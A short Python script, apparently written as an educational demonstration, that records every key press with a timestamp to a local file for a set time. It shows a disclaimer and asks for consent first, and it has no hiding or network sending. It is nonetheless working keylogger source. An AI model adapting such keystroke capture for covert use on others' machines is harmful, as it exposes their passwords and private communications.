import pynput
import time
import os
import sys
log_file_path = "keylogger_log.txt"
def keylogger(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())  # Get the current time
    try:

        event = f"{timestamp} - {key.char}\n"
    except AttributeError:

        event = f"{timestamp} - {key}\n"

    with open(log_file_path, "a") as log_file:
        log_file.write(event)

print("---------------- Keylogger Disclaimer ----------------")
print("\nThis keylogger is for educational purposes only.")
print("Please only use it on devices you own or have permission to monitor.")
print("By using this program, you agree not to use it for any unethical or illegal activity.")
print("Do you accept these terms and conditions? (y/n): ")

accept_terms = input()

if accept_terms.lower() != 'y':
    print("You must accept the terms and conditions to continue.")
    sys.exit()

try:
    log_duration = int(input("\nEnter the duration (in seconds) to record keystrokes: "))
except ValueError:
    print("Invalid duration. Please enter a number.")
    sys.exit()

print(f"\nThe keylogger will run for {log_duration} seconds...")
print("Start typing now. Your keystrokes will be logged.")
listener = pynput.keyboard.Listener(on_press=keylogger)
listener.start()
start_time = time.time()
end_time = start_time + log_duration

while time.time() < end_time:
    time.sleep(1)

listener.stop()

print("\nThe keylogger has stopped.")
print(f"Your keystrokes have been logged. The log file is saved at: {os.path.abspath(log_file_path)}")
print("You can view the logged keystrokes in the 'keylogger_log.txt' file.")
